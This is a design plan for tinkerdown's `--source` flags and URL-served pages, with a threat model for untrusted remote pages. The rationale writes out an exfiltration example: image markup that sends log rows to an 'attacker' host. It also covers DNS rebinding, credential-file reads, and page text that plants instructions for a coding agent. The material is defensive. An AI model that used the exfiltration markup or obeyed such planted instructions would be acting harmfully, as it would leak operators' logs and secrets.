# Plan: one-command apps — sources from flags, pages from a URL

State — Done: nothing. Next: plan signoff, then Phase 1.

## Context

The log viewer's `index.md` ships demo sources, because a tinkerdown page can't run without its sources written into it, and running it means cloning its repo. Its review asked for a production page with no demo, for following your own logs without editing the page ([#327](https://github.com/livetemplate/tinkerdown/issues/327)), and for running a one-file app in one command ([#325](https://github.com/livetemplate/tinkerdown/issues/325)). This plan adds these generic pieces to tinkerdown:

- **`--source` flags:** `tinkerdown serve` takes stream sources on the command line.
- **`inputs: ["*"]`:** a merge source takes every stream source the page can see.
- **`accepts`:** the page declares what sources it takes (kinds, how many, a hint), and `serve` checks flags against it.
- **`[*] field` tabs:** a tabs heading gets one tab per input of the merge below it.
- **A serve prompt:** when a page needs sources and has none, `serve` asks for them in a terminal.
- **Pages from a URL:** `tinkerdown serve <url>` downloads one page and serves it; `serve <file.md>` or `serve file:///path/page.md` serves one local page. A page from a URL can never run commands, read files or send data elsewhere.
- **Help an agent can follow:** `tinkerdown serve --help` explains `--source` with examples and how to find sources, so a coding agent can set the app up from the help alone. Today `serve --help` ignores the flag and starts serving the current directory.

It also fixes one gap that a mistyped flag hits: a block whose source fails to build shows "Connecting..." forever.

The log viewer then ships with no sources, and a user runs it without cloning anything:

```sh
tinkerdown serve --allow-exec https://raw.githubusercontent.com/livetemplate/logviewer/main/index.md \
  --source 'api=docker logs -f --timestamps api' --source 'app=file:./logs/app.log'
```

## Product

| User journey | What they see | Built on |
|---|---|---|
| Run a one-file app without cloning it | `serve <url> --source ...`, the page's hash, then the app | URL pages |
| Run a page from a URL that declares its own sources | a refusal naming them, and how to run a reviewed local copy | remote page check |
| Follow my logs without editing files | `serve ... --source name=...`, then a tab per source | `--source`, `inputs: ["*"]`, `[*] source` tabs |
| Start with no idea what to pass | `serve` asks, then prints the flags to reuse | serve prompt |
| Run from an agent or CI | no prompt; usage printed; page shows the empty state | terminal check |
| Let a coding agent set it up | `serve --help` says what to run and how to find sources | serve help |
| Mistype a source | the block shows the error, not "Connecting..." | block error |

Serving the log viewer from its URL:

```
$ tinkerdown serve --allow-exec https://raw.githubusercontent.com/livetemplate/logviewer/main/index.md --source 'api=docker logs -f api'
Fetched index.md (4.1 KB, sha256 3f9a…c21e). Pin it with …/index.md#sha256=3f9a…c21e
🌐 Server running at http://localhost:8080
```

A page from a URL that declares its own sources:

```
$ tinkerdown serve https://example.com/tool.md
tool.md declares sources that run commands or read files:
  deploy (exec): ./deploy.sh
  secrets (json): ~/.aws/credentials
A page from a URL can't declare these. Pass sources as --source flags instead, or download
the page, review it, and serve the local copy: tinkerdown serve tool.md
```

A terminal run with no sources:

```
$ tinkerdown serve --allow-exec .
index.md needs at least 1 source: Logs to follow: a container, a dev server or a log file.
Add one as name=command or name=file:path. Leave empty to finish.
source> api=docker logs -f --timestamps api
source> app=file:./logs/app.log
source>
Next time, run:
  tinkerdown serve --allow-exec . --source 'api=docker logs -f --timestamps api' --source 'app=file:./logs/app.log'
🌐 Server running at http://localhost:8080
```

`tinkerdown serve --help` prints, and exits without serving:

```
Usage: tinkerdown serve [directory | file.md | file:// URI | https:// URL] [flags]

Serves the markdown pages in directory (default: current directory), one file, or one page from a URL.

Flags:
  --source NAME=COMMAND    Follow a command's output as stream source NAME (needs --allow-exec)
  --source NAME=file:PATH  Follow a file as stream source NAME
  --allow-exec             Let sources run commands
  --port N, --host ADDR    Where to listen (default localhost:8080)
  ...

Finding sources to follow:
  docker ps --format '{{.Names}}'   -> --source 'NAME=docker logs -f --timestamps NAME'
  a project's start command          -> --source 'api=cd ../api && npm run dev'
  a log file                         -> --source 'app=file:/var/log/app.log'
  journalctl                         -> --source 'journal=journalctl -f -o short-iso'

Without a terminal, serve never prompts: pass every source as a flag.
A page from a URL can't declare its own sources, actions or scripts; download and review it to run it locally.
```

Without a terminal (an agent, CI, a pipe), `serve` prints the same instructions once, without prompting, and starts. The page then shows its empty state:

```
┌ Logs ─────────────────────────────────────┐
│ [All]                                     │
├───────────────────────────────────────────┤
│ No log sources. Restart with              │
│   --source 'name=command'                 │
│   --source 'name=file:path'               │
└───────────────────────────────────────────┘
```

With the two sources above, the heading `## [All] | [*] source` renders as:

```
┌ Logs ─────────────────────────────────────┐
│ [All] [api] [app]                         │
│ 17:02:11 api  INFO  GET /users 200        │
│ 17:02:12 app  WARN  slow query 812ms      │
└───────────────────────────────────────────┘
```

A block whose source is invalid shows the error in place of its content:

```
┌───────────────────────────────────────────┐
│ ⚠ source "api": set exactly one of cmd or │
│   file                                    │
└───────────────────────────────────────────┘
```

## Decisions

- `--source name=value` adds a `stream` source. A value starting with `file:` follows that file; any other value is a command. The flag splits on the first `=` only, so commands may contain `=`. A name must match `[A-Za-z0-9_-]{1,32}`, because names end up in filter expressions, CSS classes and tab labels. The reuse line `serve` prints quotes each value for the shell.
  alternative: separate `--source-cmd` and `--source-file` flags
  because: one flag and one grammar serve both the command line and the prompt
- Flag sources take precedence over page frontmatter and `tinkerdown.yaml`, but not over approved sources. A flag naming an approved source fails at startup.
  because: a flag is the operator's explicit choice for this run, and approved sources are pinned by design (#324)
- A flag command still needs `--allow-exec`. Without it, `serve` refuses the flag at startup and names `--allow-exec`.
  alternative: treat a command typed by the operator as consent on its own
  because: one gate for every command is easier to reason about than per-source consent
- A merge marks "every stream source" with `inputs: ["*"]`, a list holding one `*`. It expands, sorted by name, to every stream source the merge can see: flag, page and site sources for an ordinary merge.
  alternative: a bare string `inputs: "*"` with a custom YAML unmarshaller
  because: `Inputs` stays `[]string`, and the config schema doesn't change shape
- An approved merge with `["*"]` expands through `mergeInputLookup`, so it sees only `tinkerdown.yaml` sources.
  because: otherwise page or flag sources would slip into an approved merge, which is the bypass #324 closed
- A merge whose `["*"]` expands to nothing is valid. Its block has no rows and `Inputs` is empty, and the page shows its own empty state. An explicit empty `inputs: []` stays an error.
  alternative: refuse to serve
  because: a page with no sources yet should still open and say what to do
- A `["*"]` merge may declare `accepts`, which says what sources the page takes: `kinds` (`cmd`, `file`, or both; default both), `min` (default 0) and `hint` (one line saying what to pass). `serve` refuses a `--source` whose kind the page doesn't accept, and a flag no page would take (likely a typo). `min` and `hint` drive the prompt, the non-terminal message and the empty state (`.Accepts`).
  alternative: no declaration; any flag feeds any `["*"]` merge
  because: the page knows what it can show; checking flags against it catches mistakes before the browser opens, and tells an agent what to pass
- `accepts` is allowed on a page from a URL, since it describes sources without running anything. A remote page can say `kinds: [file]` to promise it never needs a command.
  alternative: none considered
- `GenericState` gains `Inputs []string`, the expanded input names of a merge block, for templates.
  alternative: none considered
- A tabs heading item `[*] field` expands to one tab per input of the lvt block's merge source, named after the input, with filter `field = input`. The parser records it as a dynamic tab group, and the server expands it when serving the page, after flags are known.
  alternative: render tabs in the block template from `.Inputs`, as `<button name="Filter" data-filter="source = {{.}}">`
  because: the heading keeps the tabs component's styling, ARIA roles and keyboard handling, and the page needs no tab markup
- `serve` prompts for sources only when stdin is a terminal and some page has a `["*"]` merge with no stream sources. Without a terminal it prints the instructions and serves the empty state.
  because: agents, CI and the e2e tests start `serve` without a terminal and must never hang
- `serve --help` (and `-h`) prints serve's own usage and exits 0 without serving. The usage leads with `--source`, gives copyable examples for docker, a dev server, a file and journald, and says that without a terminal every source must be a flag. The non-terminal message points to `serve --help`.
  because: an agent reads the help and the error output, not the docs site; the help has to be enough to finish the setup
- `serve` takes a remote URL, a local `.md` file (a path or a `file://` URI) or a directory. A `file://` URI is the same as its path: a local page, with no remote-page rules. A URL is fetched once at startup over HTTPS (or HTTP to localhost), capped at 1 MiB, into a temp directory, and served as the site's only page. A file is served as the only page, with its directory as the site root. Neither watches for changes.
  alternative: a separate `tinkerdown run <url>` command
  because: one command with one set of flags; the argument's form says what it is
- A page from a URL is checked against an allow-list, not a deny-list. Its frontmatter may hold only `title`, `merge` sources (with `accepts`), `styling` and `charts`; its blocks may only be `lvt` blocks and plain markdown. Anything else fails at startup with a message listing it: other sources, actions, schedules and imperatives, includes and partials, `server`, `wasm` and `embed-lvt` blocks, and exec toolbars. There is no flag to lift this: to run such a page, the user downloads it, reviews it and serves the local file.
  alternative: a `--trust` flag guarded by a `#sha256=` pin, or a prompt to confirm the page's commands.
  because: a deny-list misses features that run code or make the server connect out, such as `server` blocks and `embed-lvt`. A flag gets passed by habit, or by an agent the refusal told how. Confirmation can't work without a terminal. Downloading makes the user own a reviewed copy, and with sources from flags most shared pages need nothing else.
- `serve` prints a fetched page's SHA-256. A URL ending in `#sha256=HEX` is refused when the content doesn't match.
  alternative: none considered
  because: the content behind a URL can change after the user read it
- A page from a URL is always served with a strict Content-Security-Policy: tinkerdown's own scripts run by nonce, with no `'unsafe-inline'`; `img-src 'self' data:`, `media-src 'self'`, `form-action 'self'`, `base-uri 'none'`, `frame-src 'none'`, `object-src 'none'`. Its HTML and templates are also sanitized at load: `on*` attributes, `javascript:` URLs, and `<script>`, `<meta>`, `<base>`, `<link>`, `<iframe>`, `<object>` and `<embed>` elements are refused.
  alternative: rely on the merge-only rule alone.
  because: the page controls its template, so `<img src="https://attacker/?{{.msg}}">` would send the logs from `--source` flags elsewhere; today's CSP allows `img-src https:`. Blocking `<script>` alone leaves `<img onerror>`, and `<meta http-equiv=refresh>` sends data without a click. The CSP and the sanitizer each catch what the other misses.
- A page from a URL loads no `tinkerdown.yaml` unless `--config` names one.
- When the server listens on a loopback address, it refuses HTTP and WebSocket requests whose `Host` isn't `localhost`, `127.0.0.1`, `[::1]` or the `--host` value.
  because: the WebSocket origin check compares `Origin` with `Host`, and DNS rebinding controls both, so any website could read the logs. This predates the plan, but the plan puts logs and command output behind it.
- Text from a page that reaches the terminal (`accepts.hint`, the names and values a refusal lists) has control characters removed, is cut to 120 characters, and is shown quoted after "the page says:". `serve --help` says page text is untrusted and that an agent must not run commands a page suggests.
  because: a page can hide terminal escape sequences, or write instructions aimed at a coding agent
- A page from a URL gets limits: a merge `buffer` of at most 10,000 rows and a `flush` of at least 50ms.
  because: otherwise a remote page could set a buffer large enough to exhaust the operator's memory
- The fetch follows at most 3 redirects, and only to `https://` targets that pass `security.ValidateHTTPURL`, so a redirect can't reach a private or metadata address. The `#sha256=` check runs on the final body. The page is saved as `page.md` in a temp directory with mode 0700, never under a name from the URL, and the directory is removed on exit.
  because: a page fetched from elsewhere shouldn't pick up whatever config sits in the current directory
- Prompt answers are not saved. After the prompt, `serve` prints the equivalent `--source` command line.
  alternative: write the answers to `tinkerdown.yaml`
  because: `serve` shouldn't change files the user didn't ask it to change
- A block whose source fails to build is sent to the page with its error as `.Error`, rendered by a default error view, instead of being dropped. The page shows the validation message without the source's command, path or environment; the server log has the full error.
  because: with `--host`, anyone who reaches the page would otherwise see command lines, which can hold tokens
  alternative: none considered

## Threat model

The operator (whoever runs `tinkerdown serve`) is trusted: their flags and local config may run commands, with `--allow-exec`. A page from a URL is not trusted. Browsers that reach the server see whatever the page shows, as today.

| # | Threat | Mitigation |
|---|---|---|
| T1 | A page from a URL runs commands on the operator's machine | merge-only rule, with no flag to lift it |
| T2 | A page from a URL reads local files (`file:`, `json`/`csv`/`sqlite` paths, includes) | merge-only rule; relative includes don't resolve (G1) |
| T3 | A page from a URL sends the operator's log rows to another site through its template (images, CSS `url()`, scripts, forms) | tighter CSP for URL pages; raw `<script>` refused; `connect-src 'self'` as today |
| T4 | The content behind the URL changes after the operator read it | fetched once at startup; `#sha256=` pin; the hash is printed |
| T5 | The fetch is intercepted | HTTPS only, except HTTP to localhost |
| T6 | A huge or slow response | 1 MiB cap and a fetch timeout |
| T7 | Flag or page sources reach an approved merge | `["*"]` expands through `mergeInputLookup` |
| T8 | A coding agent works around a refusal | there is no flag to pass; running the page means downloading it, which the refusal tells the agent to review with the user |
| T9 | A mistyped or unexpected `--source` feeds a page silently | flags are checked against each page's `accepts`; unused flags are refused |
| T10 | A page from a URL runs code through features other than sources (`server`, `wasm` or `embed-lvt` blocks, schedules, includes) | allow-list of frontmatter keys and block types |
| T11 | Template markup sends data out without `<script>` (`onerror`, `javascript:`, meta refresh, `<base>`) | strict CSP with nonces; sanitizer at load |
| T12 | A website reads the logs through DNS rebinding | `Host` allow-list on loopback |
| T13 | Page text attacks the terminal or a coding agent | control characters removed, length cap, quoted as page text; help says page text is untrusted |
| T14 | A page from a URL exhausts memory | caps on `buffer` and `flush` |
| T15 | A redirect downgrades or redirects the fetch; a URL path escapes the temp directory | redirect rules; fixed file name |

Out of scope:
- **Links a viewer clicks:** a link in the page's template can carry log text to another site when a viewer clicks it. The CSP can't block navigation, so this is a residual risk, and the docs name it.
- **Commands in `--source`:** they run with the operator's rights by design, the same as `exec` sources today.
- **Network exposure:** with `--host`, other machines can read the logs, as with any tinkerdown page today.

## Files

tinkerdown (worktree `.worktrees/source-flags`):

- `cmd/tinkerdown/commands/serve.go`: parse `--source`; check them against `--allow-exec` and approved names; the prompt and the non-terminal message; `--help` and `-h`.
- `cmd/tinkerdown/main.go`: the top-level usage line for `serve` mentions `--source`.
- `cmd/tinkerdown/commands/source_flags.go` new?: `parseSourceFlag`, the prompt loop and `printReuse`, with tests.
- `internal/config/config.go`: hold flag sources apart from site sources (`FlagSources`).
- `internal/config/stream_sources.go`: `["*"]` in `ValidateStreamSource`; `ExpandMergeInputs(name, src, visible)`; `Accepts` and the flag check.
- `internal/server/websocket.go`: flag tier in `getEffectiveSource`; `["*"]` expansion through `mergeInputLookup`; send failed blocks with `.Error`.
- `internal/source/stream.go`: build a merge from the expanded inputs.
- `internal/runtime/state.go`: `Inputs` on `GenericState`.
- `parser.go`: record `[*] field` as a dynamic tab group.
- `internal/server/server.go`: expand dynamic tab groups when serving a page.
- `cmd/tinkerdown/commands/remote_page.go` new?: fetch, size cap, timeout, `#sha256=` check, the remote page check (sources, actions, raw `<script>`) and its message.
- `internal/server/middleware.go`: the strict policy from `buildCSP` for a page from a URL, with per-response script nonces; the `Host` allow-list.
- `internal/security/` (existing package): the remote page sanitizer, `sanitizeRemotePage`, and `cleanPageText` for terminal output.
- `internal/server/server.go`: serve a single page (`Discover` over one file).
- `go.mod`: add `golang.org/x/term` for the terminal check.
- Tests: `source_flags_test.go` new?, `stream_source_e2e_test.go`, `internal/server/source_precedence_test.go`, `parser_test.go`.
- Docs: `docs/sources/stream.md` (`["*"]`, `Inputs`, `[*]` tabs), `docs/reference/cli.md` (`--source`, URL and file arguments, what a page from a URL may declare), `docs/guides/data-sources.md` (tabs), `CHANGELOG.md`.

logviewer:

- `index.md`: no sources except `all: {type: merge, inputs: ["*"], accepts: {min: 1, hint: "Logs to follow: a container, a dev server or a log file"}}`; heading `## [All] | [*] source`; an empty state for `{{if not .Inputs}}`.
- `scripts/demo-logs.sh` and `logs/app.log` move to `e2e/testdata/`; the e2e test passes them as `--source` flags.
- `README.md` "Run it": the one-command run from the raw GitHub URL; "Add your own logs": `--source`, no editing `index.md`. `AGENTS.md` shrinks to: install, ask the user which logs, run `tinkerdown serve --help`, then serve with `--source`.

## Tracker

Assumptions (A) are checked before building, risks (R) are what we'd act on, and gaps (G) are requirements no phase owns.

| # | Type | Item | Severity | Status |
|---|---|---|---|---|
| A1 | assumption | The server builds each page's HTML when serving it, or can post-process it, so dynamic tab groups expand per request with current sources. | high | open (Phase 2) |
| A2 | assumption | The client renders a block that arrives with only `.Error` set, so a failed block can reuse the normal path. | medium | open (Phase 1) |
| A3 | assumption | `serve` knows every page's sources before it listens (`Discover` runs first), so it can decide whether to prompt. | medium | open (Phase 3) |
| A5 | assumption | Every inline `<script>` tinkerdown emits in `server.go` can carry a nonce, and Mermaid's `'unsafe-eval'` isn't needed on pages from a URL. | high | open (Phase 4) |
| A4 | assumption | `Discover` can be pointed at one file, so a URL or file page is routed at `/` without serving its directory's other files. | medium | open (Phase 4) |
| R1 | risk | Flag sources apply to every page of a multi-page site, which may surprise a site author. Mitigation: flags only feed pages that ask for them through `["*"]` or a name; document it. | medium | open |
| R2 | risk | The `[*]` tabs and the block's `.Inputs` could disagree if they resolve sources differently. Mitigation: both call `ExpandMergeInputs`. | medium | open |
| R3 | risk | Shared apps that need their own non-stream sources (for example a public REST API) can't run from a URL. Mitigation: download and serve locally; revisit with a narrow allow-list of remote-only source types if this blocks real apps. | low | open |
| G1 | gap | A page from a URL can't use relative includes, partials or local assets; it must be self-contained. | low | unowned |

## Acceptance criteria

- [ ] `/simplify` has run on each phase's diff.
- [ ] `go test ./cmd/tinkerdown/commands/...` covers `parseSourceFlag` (`a=b=c` keeps `b=c`; `file:` prefix; a missing name is refused), a command flag without `--allow-exec` refused, and a flag naming an approved source refused.
- [ ] `go test ./internal/config/...` covers `["*"]` expanding sorted, `["*"]` expanding to nothing being valid, and `inputs: []` still refused.
- [ ] `accepts`: a `cmd` flag is refused by a page with `kinds: [file]`; a flag no page takes is refused; `min` and `hint` appear in the prompt and the non-terminal message; a page from a URL with `accepts` is allowed.
- [ ] `TestApprovedMergePinsItsInputs` gains a `["*"]` case: an approved merge sees no page or flag sources.
- [ ] A precedence test: a flag source beats a page source of the same name.
- [ ] `parser_test.go`: `## [All] | [*] source` records a dynamic tab group.
- [ ] `TestStreamSource_E2E` (chromedp, Docker Chrome) gains subtests:
  - a page with `inputs: ["*"]` served with two `--source` flags shows a tab per source, and each tab filters to it
  - with no sources, the page shows its empty state
  - an invalid source shows its error in the block
- [ ] `tinkerdown serve --help` prints the usage above and exits 0 without listening (a test in `cmd/tinkerdown/commands/cli_test.go`); every example in it is checked to parse with `parseSourceFlag`.
- [ ] The prompt: a test drives it through a pseudo-terminal and checks the printed reuse line; a run with stdin not a terminal doesn't block.
- [ ] Pages from a URL, tested against an `httptest` server in `cmd/tinkerdown/commands`:
  - a merge-only page serves
  - a page with an `exec`, `stream` or file-reading source, an action, a schedule, an include, a `server` or `embed-lvt` block, an `on*` attribute, a `javascript:` URL, or a `<script>`, `<meta>` or `<base>` element is refused, and the same file served locally runs
  - a merge `buffer` over 10,000 is refused; a redirect to `http://` or to a private address is refused; a URL path with `..` still saves as `page.md`
  - a hint holding `\x1b[2J` prints without the escape sequence
  - a `#sha256=` mismatch, a body over 1 MiB and a non-localhost `http://` URL are refused
  - no `tinkerdown.yaml` is read without `--config`
- [ ] `TestStreamSource_E2E` gains a subtest serving its page from an `httptest` URL with `--source` flags, in Docker Chrome. The page's template includes `<img src="http://<other host>/?{{.msg}}">`, and the other host receives no request.
- [ ] With the server on `127.0.0.1`, an HTTP request and a WebSocket upgrade with `Host: evil.example` are refused, and `Host: localhost:PORT` is accepted.
- [ ] A failed block's page error contains no command text; the server log has it.
- [ ] `parseSourceFlag` refuses names outside `[A-Za-z0-9_-]{1,32}`; the reuse line round-trips through `sh -c` for a command holding a single quote.
- [ ] `serve page.md` and `serve file:///abs/page.md` serve that page at `/` and no other file in its directory; a `file://` URI with a host other than empty or `localhost` is refused.
- [ ] logviewer: `cd e2e && go test ./...` passes with the demo passed as flags, and `index.md` has no `cmd` or `file`.
- [ ] Full tinkerdown suite green; pre-commit passes; `prereview check` clean on changed docs.

## Constraints

- A page with explicit `inputs` and fixed tabs behaves as today.
- Approved sources stay pinned: no flag, page or `["*"]` expansion reaches into an approved merge.
- `serve` never waits for input without a terminal.
- Commands, from any origin, run only with `--allow-exec`.
- A page from a URL never runs a command or code on the server, reads a local file, makes the server connect out, or sends data to another origin.
- e2e tests use real Docker Chrome and are never skipped.

## Contract

```
--source NAME=COMMAND        stream source running COMMAND (needs --allow-exec)
--source NAME=file:PATH      stream source following PATH
serve URL[#sha256=HEX]       fetch one page (https, or http to localhost; max 1 MiB) and serve it
serve FILE.md                serve one local page
serve file:///PATH/FILE.md   the same as serve /PATH/FILE.md
page from a URL              frontmatter: title, merge sources (+accepts), styling, charts
                             blocks: lvt and markdown; no on*, javascript:, script/meta/base/link/iframe/object/embed
                             limits: buffer <= 10000, flush >= 50ms; strict CSP
inputs: ["*"]                every stream source the merge can see, sorted by name
accepts:                     on a ["*"] merge; allowed on a page from a URL
  kinds: [cmd, file]         source kinds the page takes (default: both)
  min: 1                     sources needed before the page is useful (default: 0)
  hint: "..."                one line shown in the prompt, the message and .Accepts.Hint
## [All] | [*] FIELD         one tab per merge input: label INPUT, filter "FIELD = INPUT"
.Inputs                      []string, a merge block's expanded inputs
```

Precedence, highest first: approved (`tinkerdown.yaml` with `generation.sources`), flags, page frontmatter, `tinkerdown.yaml`.

## Phases

### Phase 1: flags and `["*"]`
- Audit: A2. Trace `getEffectiveSource`, `mergeInputLookup` and `NewStreamSource` for where expansion belongs.
- Implementation: the `Host` allow-list, `--source` parsing and checks, the flag tier, `ExpandMergeInputs`, `Inputs`, `accepts` and the flag check, block errors.
- Acceptance: `/simplify`, then the commands, config, `accepts`, precedence and approved-merge criteria.

### Phase 2: `[*]` tabs
- Audit: A1. Find where page HTML is produced per request, and how `--watch` reparses.
- Implementation: dynamic tab group in `parser.go`, expansion in the server.
- Acceptance: `/simplify`, the parser test and the e2e tab subtest.

### Phase 3: the prompt
- Audit: A3. Confirm `Discover` runs before listening.
- Implementation: terminal check, prompt loop, reuse line, non-terminal message, `serve --help`.
- Acceptance: `/simplify`, the prompt criterion, the e2e empty-state subtest, docs and CHANGELOG, the full suite.

### Phase 4: pages from a URL
- Audit: A4. Check how `Discover`, routing and the watcher assume a directory.
- Implementation: URL and file arguments, the fetch, the allow-list check, the sanitizer, the strict CSP with nonces, the limits, redirect rules, `#sha256=`. The `Host` allow-list lands in Phase 1, since it protects every page.
- Acceptance: `/simplify`, the URL, file and e2e URL criteria, docs.

### Phase 5: log viewer
- Audit: re-read the Contract against what shipped; write any drift into this plan in the same commit.
- Implementation: the logviewer files listed above.
- Acceptance: `/simplify`, the logviewer criterion, and a check in a real browser through chromedp screenshots.

## Delivery

1. Open the plan PR, run `/planprcommentsfix`, get signoff, merge. Never merge without signoff.
2. Create `.worktrees/source-flags` only after the plan is merged. One PR for Phases 1–3, one for Phase 4, then the logviewer change once it's released or built from `main`.
3. Release only through `release.sh`.
